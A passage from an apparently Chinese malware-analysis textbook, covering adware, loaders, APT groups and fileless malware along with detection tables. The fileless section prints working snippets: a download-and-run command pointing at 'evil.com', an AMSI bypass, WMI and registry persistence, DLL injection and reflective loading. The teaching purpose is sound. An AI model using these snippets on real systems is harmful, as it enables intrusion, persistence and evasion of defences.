| **捆绑安装** | 隐藏在合法软件安装包的"高级安装"选项中 | 未经同意安装 |
| **推广安装** | 推荐安装其他软件，获取推广佣金 | 系统性能下降 |

**代表性家族**：
- **OpenCandy**：在免费软件安装过程中推荐其他软件
- **BrowseFox/Fireball**：修改浏览器设置、劫持搜索流量，2017年发现影响约2.5亿台设备
- **Fireball**（中国韧量科技开发）：既是广告软件也可作为后门使用，具备远程代码执行能力

#### 与恶意软件的界限

广告软件和灰色软件与恶意软件的界限日益模糊：
- 部分广告软件使用Rootkit技术隐藏自身（如DNS劫持驱动）
- 某些PUP在更新中加入勒索软件或加密货币挖矿功能
- 广告软件收集的数据可被用于精准投放恶意广告（Malvertising）
- 多个APT组织利用合法广告技术作为投递渠道

---

### 24.4.11 加载器与Dropper

加载器（Loader）和Dropper是恶意软件攻击链中的**初始投递环节**，本身功能有限，核心价值在于将后续恶意载荷安全地递送到目标系统。理解这一环节对于**威胁狩猎**至关重要——在加载器阶段拦截，可以阻止整个攻击链的后续展开。

#### 加载器的技术架构


#### 代表性家族

**BazarLoader（BazarBackdoor）**
- TrickBot组织开发的恶意软件加载器，2020年首次出现
- **投递方式**：钓鱼邮件（伪造人力资源/物流通知）、SEO投毒
- **技术特征**：
  - 使用Go语言编写
  - 通过HTTPS与C2通信，使用DNS over HTTPS（DoH）隐藏域名解析
  - 支持反射DLL加载（Reflective DLL Loading）
  - 一旦获得足够的权限，投放Cobalt Strike或Ryuk/Conti勒索软件
- **检测指标**：异常的schtasks.exe调用、PowerShell脚本执行、与特定域名的HTTPS连接

**IcedID（BokBot）**
- 最活跃的银行木马/加载器之一，2017年首次发现
- **演进历程**：银行木马→勒索软件初始访问代理→Ryuk/REvil/DarkSide的投递通道
- **技术特征**：
  - 使用多阶段加载（第一阶段：轻量级DLL加载器；第二阶段：完整功能模块）
  - 配置数据存储在加密的资源节区中
  - C2通信使用HTTPS，配置中包含多个备用域名
  - 支持进程注入（注入到合法浏览器进程中）
- **关键检测指标**：
  - 异常的DLL注册（`rundll32.exe`加载可疑DLL）
  - 注册表自启动项
  - 异常的HTTPS连接模式

**Dridex Loader**
- Dridex银行木马的加载器组件，以高度反分析能力著称
- **技术特征**：使用宏文档投递、多阶段下载、与Emotet协同投递
- **功能**：除银行凭证窃取外，还作为勒索软件投递通道（LockBit、REvil）

---

### 24.4.12 APT组织与关联恶意软件

高级持续性威胁（APT）组织通常由国家支持，拥有丰富的资源和高级技术能力。APT组织的恶意软件具有**高度定制化、针对性强、生命周期长**的特点。

#### 主要APT组织

**APT28（Fancy Bear / Sofacy）**
- 与俄罗斯军事情报机构（GRU）相关联，自2004年以来一直活跃
- **攻击工具集**：
  - X-Agent：模块化后门，支持Windows/Linux/iOS/Android多平台
  - X-Tunnel：网络隧道工具，用于穿越网络边界
  - Komplex：macOS后门
  - Zebrocy：Delphi/Go/C#多语言后门
- **攻击手法**：鱼叉式钓鱼邮件、零日漏洞利用、水坑攻击
- **典型目标**：北约组织、政府机构、军事组织、媒体机构
- **技术特征**：使用COM对象劫持、WMI持久化、自定义加密通信协议
- **关联活动**：2016年美国DNC邮件泄露事件、2018年WADA兴奋剂数据库攻击

**APT29（Cozy Bear / The Dukes）**
- 与俄罗斯对外情报局（SVR）相关联，以高度隐蔽性和操作安全性著称
- **攻击工具集**：
  - WellMess：Go语言后门
  - WellMail：邮件窃取工具
  - SeaDuke/MiniDuke/CosmicDuke：Duke系列工具集
  - SUNBURST：SolarWinds供应链攻击中使用的后门
- **攻击手法**：供应链攻击、云服务滥用、合法工具利用（Living off the Land）
- **典型目标**：政府机构、智库、医疗机构、疫苗研发机构
- **技术特征**：高度注重操作安全性（OPSEC）、使用合法云服务作为C2（如Microsoft Graph API）、多层加密通信
- **标志性事件**：2020年SolarWinds供应链攻击，通过在SolarWinds Orion软件更新中植入后门，影响约18,000个组织

**Lazarus Group（HIDDEN COBRA）**
- 与朝鲜侦察总局相关联，同时进行间谍活动和经济获利攻击
- **攻击工具集**：
  - Brambul：SMB蠕虫组件
  - Joanap：模块化后门
  - Duuzer：后门程序
  - HOPLIGHT：远程访问工具
  - AppleJeus：加密货币交易软件木马化版本
- **攻击手法**：水坑攻击、供应链攻击、加密货币交易所攻击、SWIFT银行系统攻击
- **典型目标**：金融机构、加密货币交易所、政府机构、娱乐公司
- **技术特征**：同时追求情报收集和经济获利、针对金融系统的专业化攻击能力
- **标志性事件**：2014年索尼影业攻击（电影《刺杀金正恩》争议）、2016年孟加拉央行SWIFT系统攻击（窃取8100万美元）、2017年WannaCry勒索蠕虫（朝鲜归因）

**APT41（Double Dragon / Winnti Group）**
- 独特的双重威胁组织，既进行国家支持的间谍活动，也进行个人经济获利攻击
- **攻击工具集**：
  - Winnti：后门程序
  - PlugX：远程访问工具
  - ShadowPad：模块化后门（被称为"超级后门"）
  - HIGHNOON：后门程序
  - MESSAGETAP：短信窃取工具
- **攻击手法**：供应链攻击、游戏行业攻击、电信基础设施攻击
- **典型目标**：游戏公司、电信运营商、医疗保健、高科技公司
- **技术特征**：使用合法数字签名、Rootkit技术、多平台攻击能力

#### APT恶意软件分析的特殊挑战

APT恶意软件与普通网络犯罪恶意软件的分析存在本质区别：

| 对比维度 | 普通恶意软件 | APT恶意软件 |
|---------|------------|------------|
| 代码复用率 | 高（使用开源工具/框架） | 低（高度定制化） |
| C2基础设施 | 固定或简单轮换 | 合法云服务、多层代理、快速切换 |
| 反分析技术 | 常规（反调试、加壳） | 高级（定制混淆、定制虚拟机保护） |
| 持久化 | 简单（注册表/服务） | 多层次（合法工具、供应链、固件级） |
| 样本可获得性 | 高（大规模分发） | 低（针对性部署） |
| 攻击生命周期 | 短（投递即利用） | 长（数月至数年的驻留） |

---

### 24.4.13 无文件恶意软件技术

无文件恶意软件（Fileless Malware）不以传统文件形式存在于磁盘上，而是驻留在内存中或利用合法系统工具（Living off the Land）执行，使得传统基于文件的检测方法失效。根据Vectra AI的报告，2023年检测到的无文件攻击同比增长超过900%。

#### 技术实现方式

**1. PowerShell恶意脚本**

PowerShell是Windows无文件攻击的首选武器，其强大的系统管理能力被攻击者充分利用。

```powershell
# 典型的无文件攻击命令

# 编码执行——绕过基本的命令行日志记录
powershell -ep bypass -w hidden -enc <Base64编码的恶意脚本>

# 远程加载并执行——不写入磁盘
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# 反射加载.NET程序集——在内存中加载恶意DLL
[System.Reflection.Assembly]::Load([byte[]]$bytes)

# AMSI绕过技术（常见模式）
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$c=$b.GetValue($null);[IntPtr]$ptr=$c.GetField('m.mContext','NonPublic,Instance').GetValue($c);[Runtime.InteropServices.Marshal]::WriteInt32($ptr,0)

# 多阶段混淆执行
$code = 'JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwA...'
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($code))
Invoke-Expression $decoded
```

**2. WMI持久化**

Windows Management Instrumentation提供事件驱动的代码执行机制，被高级攻击者广泛用于无文件持久化。

```powershell
# WMI事件订阅持久化示例
# 创建事件过滤器——在系统启动后60秒触发
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "SecurityFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 创建消费者——执行恶意脚本
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "SecurityConsumer"
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c <恶意命令>"
}

# 绑定过滤器和消费者
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**3. 注册表存储**

将恶意代码存储在注册表键值中，通过脚本读取并执行。

```powershell
# 注册表存储恶意载荷示例
# 1. 将编码后的恶意脚本存储在注册表中
$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("恶意脚本内容"))
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion" -Name "CacheData" -Value $encodedScript

# 2. 在启动时从注册表读取并执行
$startupScript = "[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion').CacheData))"
Invoke-Expression $startupScript
```

**4. 进程注入技术**

将恶意代码注入到合法进程中执行，是无文件攻击的核心技术之一。

```python
# 进程注入的基本原理（Windows API伪代码）
# 使用ctypes调用Windows API实现

import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32')

# 常见的注入技术
INJECTION_TECHNIQUES = {
    'DLL注入': {
        'API': ['OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory',
                'CreateRemoteThread'],
        '特征': '将DLL路径写入远程进程，创建线程调用LoadLibrary',
        '检测': '监控CreateRemoteThread调用、DLL加载事件'
    },
    '进程镂空(Process Hollowing)': {
        'API': ['CreateProcess(SUSPENDED)', 'NtUnmapViewOfSection',
                'VirtualAllocEx', 'WriteProcessMemory', 'ResumeThread'],
        '特征': '创建挂起的合法进程，替换其内存内容后恢复执行',
        '检测': '监控suspended进程创建、内存内容与磁盘文件不匹配'
    },
    'APC注入': {
        'API': ['OpenThread', 'QueueUserAPC'],
        '特征': '向目标线程的APC队列注入恶意代码，等待线程调度时执行',
        '检测': '监控异常的QueueUserAPC调用'
    },
    '线程劫持': {
        'API': ['SuspendThread', 'GetThreadContext', 'SetThreadContext',
                'ResumeThread'],
        '特征': '挂起合法线程，修改其执行上下文指向恶意代码',
        '检测': '监控线程上下文异常修改'
    },
    '进程空洞化（Process Doppelgänging）': {
        'API': ['NtCreateTransaction', 'NtCreateSection',
                'NtCreateProcessEx'],
        '特征': '利用NTFS事务机制创建进程的透明副本',
        '检测': '传统的进程创建监控难以检测'
    }
}

# 远程线程注入核心步骤（概念代码）
def inject_dll(target_pid, dll_path):
    # 1. 打开目标进程
    h_process = kernel32.OpenProcess(
        0x1F0FFF,  # PROCESS_ALL_ACCESS
        False,
        target_pid
    )

    # 2. 在目标进程中分配内存
    dll_path_bytes = dll_path.encode('utf-8') + b'\x00'
    remote_memory = kernel32.VirtualAllocEx(
        h_process, None, len(dll_path_bytes),
        0x3000,  # MEM_COMMIT | MEM_RESERVE
        0x40     # PAGE_EXECUTE_READWRITE
    )

    # 3. 写入DLL路径
    kernel32.WriteProcessMemory(
        h_process, remote_memory,
        dll_path_bytes, len(dll_path_bytes), None
    )

    # 4. 获取LoadLibraryA地址
    load_library_addr = kernel32.GetProcAddress(
        kernel32.GetModuleHandleA(b'kernel32.dll'),
        b'LoadLibraryA'
    )

    # 5. 创建远程线程调用LoadLibraryA
    kernel32.CreateRemoteThread(
        h_process, None, 0,
        load_library_addr, remote_memory,
        0, None
    )
```

**5. .NET反射加载**

利用.NET框架的反射机制在内存中加载和执行恶意程序集，完全不写入磁盘。

```csharp
// .NET反射加载（C#示例）
byte[] assemblyBytes = Convert.FromBase64String(base64EncodedMalware);
Assembly loadedAssembly = Assembly.Load(assemblyBytes);
MethodInfo entryMethod = loadedAssembly.EntryPoint;
entryMethod.Invoke(null, new object[] { new string[] { } });
```

#### 检测与防御

| 检测手段 | 技术原理 | 覆盖范围 | 部署建议 |
|---------|---------|---------|---------|
| **PowerShell日志** | Script Block Logging记录所有执行的脚本内容 | PowerShell无文件攻击 | 必须启用，配合SIEM分析 |
| **AMSI集成** | 反恶意软件扫描接口在脚本执行前进行内容扫描 | PowerShell、VBScript、JavaScript | 启用并更新AMSI提供商 |
| **Sysmon** | 记录详细的系统事件（进程创建、网络连接、注册表修改等） | 所有类型的无文件攻击 | 配置适当的监控规则 |
| **EDR** | 终端检测与响应，基于行为分析检测异常 | 全面覆盖 | 部署商业或开源EDR方案 |
| **内存取证** | 分析进程内存中的可疑内容 | 驻留在内存中的恶意代码 | 使用Volatility框架 |
| **WMI审计** | 监控WMI事件订阅的创建和修改 | WMI持久化 | 启用WMI审计日志 |
| **注册表监控** | 监控敏感注册表键值的修改 | 注册表存储型攻击 | 使用Sysmon或专用监控工具 |

---

### 24.4.14 恶意软件家族综合对比

下表提供各类恶意软件的关键特征对比，便于快速识别和归类：

| 类别 | 自我复制 | 需要用户交互 | 加密/破坏 | 持久化 | 横向移动 | 隐蔽性 |
|------|---------|-------------|----------|--------|---------|--------|
| 文件感染型病毒 | ✅ | 部分（需运行宿主） | 可选 | 高 | 低 | 中 |
| 蠕虫 | ✅ | ❌ | 可选 | 中 | 高 | 低-中 |
| 木马/后门 | ❌ | ✅ | ❌ | 高 | 中-高 | 中-高 |
| 勒索软件 | ❌ | 部分 | ✅ | 中 | 高 | 中 |
| 银行木马 | ❌ | ✅ | ❌ | 高 | 低 | 高 |
| 信息窃取器 | ❌ | ✅ | ❌ | 低-中 | 低 | 中 |
| 间谍软件 | ❌ | 部分 | ❌ | 极高 | 低 | 极高 |
| Rootkit | ❌ | 部分 | 可选 | 极高 | 低 | 极高 |
| Bootkit | ❌ | ❌ | 可选 | 极高 | 低 | 极高 |
| 挖矿木马 | 部分 | ❌ | ❌ | 中 | 中-高 | 中-高 |
| 加载器/Dropper | ❌ | ✅ | ❌ | 低 | 低 | 中 |
| 无文件恶意软件 | ❌ | 部分 | 可选 | 中-高 | 中-高 | 极高 |

### 24.4.15 MITRE ATT&CK视角下的恶意软件

MITRE ATT&CK框架为恶意软件分析提供了标准化的技术分类体系。下表展示了各恶意软件类别在ATT&CK战术阶段的典型分布：

| 战术阶段 | 文件感染型 | 蠕虫 | 木马/后门 | 勒索软件 | 挖矿木马 | 无文件攻击 |
|---------|-----------|------|---------|---------|---------|-----------|
| **初始访问** | - | 漏洞利用 | 钓鱼/漏洞 | 钓鱼/RaaS投递 | 漏洞利用/弱口令 | 钓鱼/漏洞 |
| **执行** | 附件执行 | 自动触发 | 用户触发 | 用户触发 | 自动执行 | 脚本解释器 |
| **持久化** | 感染文件 | 系统文件 | 服务/注册表 | 服务/计划任务 | 服务/计划任务 | WMI/注册表 |
| **权限提升** | 有限 | 有限 | 高级利用 | 高级利用 | 有限 | 高级利用 |
| **防御规避** | 多态 | 基础 | 高级 | 中等 | 中等 | 极高 |
| **凭证访问** | 有限 | 有限 | 大量 | Active Directory | 有限 | 大量 |
| **横向移动** | 无 | 蠕虫传播 | PsExec/WMI | AD渗透 | 扫描传播 | WMI/PowerShell |
| **数据窃取** | 无 | 无 | 大量 | 数据窃取（双重勒索） | 无 | 大量 |
| **影响** | 文件破坏 | 带宽消耗 | 多种 | 加密勒索 | 资源消耗 | 多种 |

---

### 24.4.16 恶意软件家族分析实战要点

在实际分析一个恶意软件样本时，判断其家族归属需要综合以下多个维度：

#### 分析流程

```mermaid
graph TD
    A[获取样本] --> B[静态初判]
    B --> C{家族特征匹配}
    C -->|已知家族| D[查阅已知情报<br>MITRE/VT/公开报告]
    C -->|未知变种| E[深度分析]

    B --> B1[文件哈希<br>VirusTotal查询]
    B --> B2[字符串提取<br>特征标识]
    B --> B3[PE结构分析<br>节区/导入表/资源]
    B --> B4[加壳检测<br>识别壳类型]

    E --> E1[脱壳/解混淆]
    E1 --> E2[反汇编/反编译]
    E2 --> E3[功能模块分析]
    E3 --> E4[C2协议逆向]

    D --> F[分析报告]
    E4 --> F

    style A fill:#1a1a2e,stroke:#e94560
    style F fill:#2d6a4f,stroke:#2d6a4f,color:#fff
```



#### 快速识别检查清单

分析样本时，按以下顺序快速识别家族归属：

| 步骤 | 检查内容 | 工具 | 典型发现 |
|------|---------|------|---------|
| 1 | 文件哈希查询 | VirusTotal、MalwareBazaar | 已知家族直接确认 |
| 2 | 字符串提取 | `strings`/FLOSS | 加密信、互斥量、C2地址 |
| 3 | PE节区分析 | PEStudio/pefile | 异常节区名和权限 |
| 4 | 导入表分析 | PEStudio/Dependency Walker | 特定API组合特征 |
| 5 | 资源节区检查 | Resource Hacker/PE资源提取 | 加密配置、嵌入文件 |
| 6 | 编译信息 | PE时间戳/PDB路径 | 编译器类型、开发者信息 |
| 7 | 加壳检测 | Detect It Easy/Exeinfo PE | 壳类型和可能的脱壳方法 |
| 8 | YARA匹配 | YARA规则库 | 已知特征匹配 |

#### 各家族的快速识别特征

| 恶意软件类别 | 识别关键特征 | 快速判断方法 |
|------------|------------|------------|
| **勒索软件** | 加密算法API调用、勒索信文件、加密文件扩展名 | 查找`CryptEncrypt`/`AES`/`RSA`相关字符串 |
| **RAT/远控** | 网络连接、屏幕截图、键盘记录 | 查找`WSAStartup`/`InternetOpen`等网络API |
| **银行木马** | 浏览器注入、表单抓取 | 查找`HttpSendRequest`/浏览器进程操作 |
| **信息窃取器** | 浏览器路径、钱包文件路径 | 查找Chrome/Firefox路径、钱包文件名 |
| **挖矿木马** | 矿池域名、矿工配置 | 查找`.xmr.`/`stratum+tcp://`等矿池字符串 |
| **蠕虫** | 网络扫描、漏洞利用代码 | 查找端口扫描逻辑、EternalBlue等漏洞利用特征 |
| **Rootkit** | 驱动加载、内核API | 查找`ZwQuerySystemInformation`等内核API |
| **加载器** | 下载执行、反射加载 | 查找`URLDownloadToFile`/`ReflectiveLoader` |
| **无文件攻击** | PowerShell调用、WMI操作 | 查找`powershell.exe`/`Invoke-Expression` |

---

### 24.4.17 常见误区与纠正

| 误区 | 正确理解 |
|------|---------|
| "勒索软件都是相同的加密模式" | 不同家族使用完全不同的加密策略：AES-RSA混合（LockBit）、ChaCha8（Conti）、间歇性加密（Play）、多算法可选（BlackCat）。检测规则不能一概而论 |
| "恶意软件只在Windows上运行" | Linux、macOS、Android、IoT设备都是目标。Mirai攻击Linux IoT设备，XCSSET针对macOS，Lemon Duck同时攻击Windows和Linux |
| "杀了恶意进程就清除了威胁" | Rootkit和Bootkit可以在OS重启后重新加载，无文件攻击依赖持久化机制（WMI/注册表）而非文件。需要检查持久化点并清除 |
| "没有文件就没有恶意软件" | 无文件恶意软件通过脚本解释器、WMI、注册表、内存执行，完全不写入磁盘。检测需要行为监控和内存分析 |
| "已知哈希可以检测所有变种" | 现代恶意软件大量使用多态、变形和代码生成技术，同一家族的每个样本哈希都不同。需要基于行为和特征的检测方法 |
| "APT攻击一定很复杂" | APT组织也大量使用"廉价"工具：合法软件（Cobalt Strike）、开源工具（Mimikatz、PsExec）、Living off the Land技术。复杂性在于隐蔽性和持久性，而非工具本身 |
| "商业安全软件可以检测所有威胁" | 恶意软件开发者持续研究和绕过商业安全产品。高级恶意软件使用定制混淆、反VM、反沙箱技术规避检测。纵深防御不可替代 |

---

### 24.4.18 进阶：恶意软件生态系统的宏观视角

理解恶意软件家族分类不仅是技术知识，更是理解整个网络犯罪生态系统的关键：

1. **供应链关系**：恶意软件之间存在复杂的投递链——Emotet投递TrickBot，TrickBot投递Cobalt Strike，Cobalt Strike投递Ryuk/Conti。分析一个样本时，需要关注其在完整攻击链中的位置。

2. **代码复用与借鉴**：LockBit 3.0借鉴BlackMatter代码，大量RAT基于Gh0st RAT框架修改。代码特征可以帮助归因和关联分析。

3. **地下经济模型**：从初始访问代理（$500-$50,000/次）到RaaS（60-80%分成），再到数据贩卖和洗钱，恶意软件产业已形成完整的经济闭环。

4. **防御启示**：理解家族分类的最终目的是**缩短检测和响应时间**。当你识别出一个BazarLoader样本时，你应该立即想到它可能投递Conti勒索软件，从而提前部署针对性防御措施。

5. **趋势演进**：恶意软件技术持续进化——Rust和Go语言编写的恶意软件越来越多（跨平台能力强）、AI辅助生成变异代码正在出现、固件级攻击（UEFI Rootkit）成为新的攻防前沿。

---

### 本节小结

恶意软件家族分类是恶意软件分析的**认知基石**。本节覆盖了主要的恶意软件类别——从最古老的文件感染型病毒到最前沿的无文件攻击，从面向个人的广告软件到国家级的APT武器。每个类别的技术原理、代表性家族和检测要点都已详细阐述。

**核心要点回顾**：
- 恶意软件分类是多维度的（功能、传播、技术、平台、商业模式），不能用单一维度概括
- 每个家族有独特的技术指纹（互斥量、加密算法、C2协议、注册表特征），这些是检测和归因的关键
- 攻击链思维至关重要——识别加载器意味着预警后续的勒索或数据窃取
- 检测方法从签名匹配到行为分析再到内存取证，需要纵深部署

在后续的小节中，我们将深入学习恶意软件分析的具体方法论和工具链，将本节建立的分类认知转化为实际的分析能力。下一节将介绍恶意软件分析的完整方法论框架，包括静态分析、动态分析和自动化分析的技术路径。
